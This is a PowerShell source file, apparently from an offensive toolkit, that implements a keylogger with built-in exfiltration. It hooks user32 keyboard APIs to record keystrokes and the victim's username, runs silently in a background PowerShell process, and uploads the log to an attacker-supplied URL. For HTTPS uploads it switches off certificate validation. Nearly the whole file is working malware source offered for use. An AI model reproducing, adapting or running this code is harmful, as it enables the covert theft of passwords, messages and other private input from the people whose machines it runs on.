function Capture-Keys {
#.SYNOPSIS
# PowerShell-based Keylogger with built-in Exfiltration
# ARBITRARY VERSION NUMBER:  1.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# TBA
# 
# Parameters:
#   -OutFile   -->  File to write captured keys to
#   -Minutes   -->  Number of minutes to capture
#   -ExfilURL  -->  URL of server to upload output file to (e.g., 'http://<ip_addr>')
#   -Help      -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
  

    Param(
        [string]$OutFile, # Need path validation
        [int]   $Minutes,
        [uri]   $ExfilURL,
        [switch]$Help
    )


    # Return Get-Help Information
    if ($Help) { return (Get-Help Capture-KeysNG) }


    # Error Correction
    if (!$Minutes) { return '[-] Must input total capture length (in minutes).' }
    if ($ExfilURL) {
        if ($ExfilURL -notlike "http*") { return '[-] Payload URL not in correct format.' }
        if ($ExfilURL -like 'https*')   { $EnableBypass = $TRUE                           }
        if (!$OutFile)                  { $OutFile = "${env:TEMP}/CK_$($Minutes)m.log"    }
    }
    

    # Optional HTTPS bypass
    $Bypass = @"
`$CertificateBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static void WebClientBypass()
    {
        ServicePointManager.ServerCertificateValidationCallback = Bypass;
    }
}
'@
Add-Type `$CertificateBypass
[SelfSignedCerts]::WebClientBypass()`n
"@


    # Primary key capture script
    $KeyCapture = @'
# Establish Output
if ($OutFile) { New-Item -Path $OutFile -ItemType File -Force | Out-Null }
else          { $TerminalOutput = $NULL }

# Meat and Potatoes
$APIcalls = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@

$Main = Add-Type -MemberDefinition $APIcalls -Name 'Win32' -Namespace 'PMATracker' -PassThru

Try {
    
    # OutFile Header
    $StartTime = Get-Date
    $StopTime  = (Get-Date).AddMinutes($Minutes)

    if ($OutFile) {
        $Header = @"
Target     : $(whoami)
Start Time : $StartTime
End Time   : $StopTime`n
"@
        [System.IO.File]::AppendAllText($OutFile, $Header)
    }

    # Begin Capture
    while ((Get-Date) -le ($StopTime)) {
        Start-Sleep -Milliseconds 25

        for ($esoteric = 9; $esoteric -le 254; $esoteric++) {

            $Status = $Main::GetAsyncKeyState($esoteric)
            if ($Status -eq -32767) {

                $CapsBool = [console]::CapsLock
                if (($CapsBool -ne $NewEmpty) -and ($CapSwitch)) {
                    if ($OutFile) { [System.IO.File]::AppendAllText($OutFile, '<CapsLock>') }
                    else          { $TerminalOutput += '<CapsLock>' }
                }
                
                # What are the vars again?
                $NewEmpty = $CapsBool ; $CapSwitch = $True

                $VertKey = $Main::MapVirtualKey($esoteric, 3)
                $KeebStatus = New-Object Byte[] 256
                $VerifyStatus = $Main::GetKeyboardState($KeebStatus)
                $KeebChar = New-Object -TypeName System.Text.StringBuilder
                $Succeeded = $Main::ToUnicode($esoteric, $VertKey, $KeebStatus, $KeebChar, $KeebChar.Capacity, 0)

                # Update Local Time in Output
                $LocalTime = Get-Date -Format "[MM/dd/yyyy HH:mm]"
                if (($LocalTime -ne $OldTime) -and ($Succeeded)) {
                    if ($OutFile) { [System.IO.File]::AppendAllText($OutFile, "`n$LocalTime`n") }
                    else          { $TerminalOutput += "`n$LocalTime`n" }
                }
                $OldTime = $LocalTime

                # Write Captured Key
                if ($Succeeded) {
                    if ($OutFile) { [System.IO.File]::AppendAllText($OutFile, $KeebChar) }
                    else          { $TerminalOutput += $KeebChar }
                }
            }
        }
    }
}

# Return Logged Contents
Finally {
    
    # Return to Terminal
    if (!$OutFile) { Write-Output $TerminalOutput }

    # Exfil to Attacker and Cleanup
    if ($ExfilUrl) {
        
        Try {
            $BaseFile = (Get-Item $OutFile).Name
            $FullPath = (Get-Item $OutFile).Fullname
            [System.Net.WebClient]::new().UploadFile("$ExfilUrl/$BaseFile",$FullPath)
            #Remove-Item $OutFile -Force
        }
        Catch { echo fuck }
    }
}
'@


    # Visual Formatting for Terminal Output
    [int]$TotalHours   = [Math]::Floor($Minutes/60)
    [int]$LeftOverMins = $Minutes%60

    if ($TotalHours -eq 0) { $RecordingLength = "$LeftOverMins minute(s)"       }
    else { $RecordingLength = "$FinalHours hour(s) and $LeftOverMins minute(s)" }

    Write-Output "[+] Recording started and set for $RecordingLength..."
    Write-Output " o  Start Time    : $(Get-Date)"
    Write-Output " o  Stop Time     : $((Get-Date).AddMinutes($Minutes))"
    if ($OutFile)  { Write-Output " o  Target Output : '$OutFile'"         }
    else           { Write-Output " o  Target Output : 'Current Terminal'" }
    if ($ExfilURL) { Write-Output " o  Target URL    : '$ExfilURL'`n"      }
    else           { Write-Output " o  Target URL    : 'N/A'`n"            }


    # Execute in the Background and Write to a File
    if ($OutFile) {

        # Preface parameters in the script prior to execution
        $SetParams = "`$Minutes = $Minutes`n"
        if ($OutFile)  { $SetParams += "`$Outfile = '$OutFile'`n"   }
        if ($ExfilURL) { $SetParams += "`$ExfilURL = '$ExfilURL'`n" }

        # Toggle HTTPS Bypass
        if ($EnableBypass) { $BackgroundScript = $SetParams + $Bypass + $KeyCapture }
        else               { $BackgroundScript = $SetParams + $KeyCapture           }

        # Run the the background in a separate PowerShell process
        $PowerShell = [PowerShell]::Create()
        [void]$PowerShell.AddScript($BackgroundScript)
        [void]$PowerShell.BeginInvoke()
    }


    # Execute in Current Session and Write to the Terminal
    else { Invoke-Expression $KeyCapture }
}